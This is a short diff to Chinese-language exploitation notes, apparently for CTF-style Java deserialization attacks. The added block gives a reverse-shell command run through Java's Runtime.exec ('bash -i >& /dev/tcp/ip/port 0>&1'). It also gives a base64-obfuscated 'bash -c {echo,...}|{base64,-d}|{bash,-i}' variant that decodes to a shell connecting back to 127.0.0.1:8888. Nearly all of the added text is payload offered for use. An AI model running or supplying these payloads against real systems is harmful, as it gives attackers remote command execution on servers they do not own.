@@ -24,6 +24,17 @@ POST请求的数据体读/flag文件发送到服务器。
  
 |base64在windows用不了。可以使用图像化版、python、BP插件java DeserializationScanner 导出base64的payload。
 ```
+命令执行反弹注意：
+```
+Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");
+注意java这里反弹shell需要改良
+
+bash -i >& /dev/tcp/ip/port 0>&1 需要base64编码再执行下面：
+
+bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
+```
+
+
 
 ^
 ## **复现**
